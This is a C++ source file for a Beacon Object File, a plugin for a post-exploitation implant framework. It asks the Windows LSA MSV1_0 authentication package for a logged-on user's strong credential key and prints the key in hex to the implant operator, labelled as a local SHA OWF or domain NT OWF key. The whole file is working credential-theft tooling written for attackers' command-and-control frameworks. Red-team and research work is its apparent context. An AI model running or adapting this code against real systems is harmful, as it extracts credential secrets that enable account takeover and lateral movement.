// Copyright (C) 2025 Evan McBroom
#include "boflib.cpp"

extern "C" __declspec(dllexport) void go(PCHAR buffer, ULONG length) {
    BeaconData beaconData;
    BeaconDataParse(&beaconData, buffer, length);
    Msv1_0::GETSTRONGCREDKEY_REQUEST request;
    Libc::memset(&request, '\0', sizeof(request));
    request.MessageType = MsV1_0GetStrongCredentialKey;
    request.RequestType = MSV1_0_GETSTRONGCREDKEY_USE_LOGON_ID;
    request.LogonId.LowPart = (BeaconDataLength(&beaconData) >= sizeof(int)) ? BeaconDataInt(&beaconData) : 0;
    Libc::CHAR_SPAN submitBuffer;
    submitBuffer.count = sizeof(request);
    submitBuffer.data = reinterpret_cast<char*>(&request);
    PIC_STRING(msv1_0, MSV1_0_PACKAGE_NAME);
    Libc::CHAR_SPAN returnBuffer;
    if (LsaApi::CallPackage(msv1_0, &submitBuffer, &returnBuffer)) {
        auto response = reinterpret_cast<Msv1_0::GETSTRONGCREDKEY_RESPONSE*>(returnBuffer.data);
        auto credKeyHelper{ reinterpret_cast<PCREDENTIAL_KEY_HELPER>(response->CredKeyReturnBuffer) };
        Libc::CHAR_SPAN key;
        key.count = MSV1_0_CREDENTIAL_KEY_LENGTH;
        if (credKeyHelper->LocalUserKey.Data[0]) {
            key.data = reinterpret_cast<char*>(credKeyHelper->LocalUserKey.Data);
            auto hexData{ Hexlify(&key) };
            PIC_STRING(message, "Local CredKey (SHA OWF): %s\n");
            BeaconPrintf(CallbackType::OUTPUT, message, hexData);
            Libc::free(hexData);
        } else {
            key.data = reinterpret_cast<char*>(credKeyHelper->DomainUserKey.Data);
            auto hexData{ Hexlify(&key) };
            PIC_STRING(message, "Domain CredKey (NT OWF/\"Secure\"): %s\n");
            BeaconPrintf(CallbackType::OUTPUT, message, hexData);
            Libc::free(hexData);
        }
        PIC_WSTRING(sspicli, L"SSPICLI.DLL");
        LAZY_LOAD_PROC(sspicli, LsaFreeReturnBuffer);
        (void)LazyLsaFreeReturnBuffer(returnBuffer.data);
    } else {
        PIC_STRING(message, "Failed to get a credential key for luid 0000-%04X.\n");
        BeaconPrintf(CallbackType::ERROR, message, request.LogonId.LowPart);
    }
}